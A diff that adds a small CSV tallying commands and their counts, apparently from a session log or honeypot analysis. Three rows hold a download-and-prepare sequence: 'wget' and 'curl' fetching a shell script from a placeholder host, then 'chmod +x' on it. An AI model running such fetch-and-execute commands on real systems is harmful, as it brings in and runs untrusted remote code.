@@ -1,0 +1,5 @@
+command,count
+exit,4
+wget http://example.com/a.sh,2
+curl http://example.com/a.sh,2
+chmod +x a.sh,2
